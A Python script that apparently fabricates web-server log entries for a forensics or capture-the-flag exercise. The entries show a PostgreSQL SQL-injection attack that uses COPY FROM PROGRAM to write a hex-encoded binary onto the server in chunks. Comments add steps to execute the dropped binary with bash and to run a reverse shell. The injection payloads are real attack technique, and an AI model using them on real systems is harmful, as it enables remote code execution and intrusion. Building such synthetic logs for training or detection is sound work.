from requests import get, post
import time
# Read the binary file main and convert it to hex
with open('main', 'rb') as f:
    main = f.read()
    main_hex = main.hex()
    
def log_message(data):
    with open("log1.txt", "a") as f:
        f.write(data + '\n')



# Fake send request to host http://61.14.202.19:8080?data=<each 32 bytes of main_hex> (No send, just write to log file)
def fake_send_request():
    for i in range(0, len(main_hex), 32):
        data = main_hex[i:i+32]
        # 192.168.25.1 - - [12/Jan/2025 02:40:52] "GET http://localhost:8080/user?id=1;SELECT%20*%20from%20cmd_exec HTTP/1.1" 200 - "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:103.0) Gecko/20100101 Firefox/103.0"
        
#         192.168.25.1 - - [12/Jan/2025 02:44:38] "GET http://localhost:8080/user?id=0;DROP%20TABLE%20IF%20EXISTS%20binary HTTP/1.1" 200 - "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:103.0) Gecko/20100101 Firefox/103.0"
# 192.168.25.1 - - [12/Jan/2025 02:45:02] "GET http://localhost:8080/user?id=1;CREATE%20TABLE%20binary(cmd_output%20text) HTTP/1.1" 200 - "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:103.0) Gecko/20100101 Firefox/103.0"
# 192.168.25.1 - - [12/Jan/2025 02:40:42] "GET http://localhost:8080/user?id=1;COPY%20binary%20FROM%20PROGRAM%20%27touch%20binary%27 HTTP/1.1" 200 - "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:103.0) Gecko/20100101 Firefox/103.0"
# 192.168.25.1 - - [12/Jan/2025 02:41:02] "GET http://localhost:8080/user?id=1;SELECT%20*%20from%20binary HTTP/1.1" 200 - "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:103.0) Gecko/20100101 Firefox/103.0"
        log_message(f"192.168.25.1 - - [{time.strftime('%d/%b/%Y %H:%M:%S')}] \"GET http://localhost:8080/user?id=0;DROP%20TABLE%20IF%20EXISTS%20binary HTTP/1.1\" 200 - \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:103.0) Gecko/20100101 Firefox/103.0\"")
        log_message(f"192.168.25.1 - - [{time.strftime('%d/%b/%Y %H:%M:%S')}] \"GET http://localhost:8080/user?id=1;CREATE%20TABLE%20binary(cmd_output%20text) HTTP/1.1\" 200 - \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:103.0) Gecko/20100101 Firefox/103.0\"")
        
        log_message(f"192.168.25.1 - - [{time.strftime('%d/%b/%Y %H:%M:%S')}] \"GET http://localhost:8080/user?id=1;COPY%20binary%20FROM%20PROGRAM%20%27echo%20{data}%20>>%20binary%27 HTTP/1.1\" 200 - \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:103.0) Gecko/20100101 Firefox/103.0\"")
        log_message(f"192.168.25.1 - - [{time.strftime('%d/%b/%Y %H:%M:%S')}] GET http://localhost:8080/user?id=1;SELECT%20*%20from%20binary HTTP/1.1 200 - Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:103.0) Gecko/20100101 Firefox/103.0\"")
        
        # DROP TABLE IF EXISTS binary
        # CREATE TABLE binary(cmd_output text)
        # COPY binary FROM PROGRAM '/bin/bash binary'
        # SELECT * from binary
# Fake check sql injection

# cur.execute('DROP TABLE IF EXISTS cmd_exec')
        # cur.execute('CREATE TABLE cmd_exec(cmd_output text)')
        # cur.execute('COPY cmd_exec FROM PROGRAM \'' + rev_shell  + '\'')
        # cur.execute('SELEC * from cmd_exec')

fake_send_request()    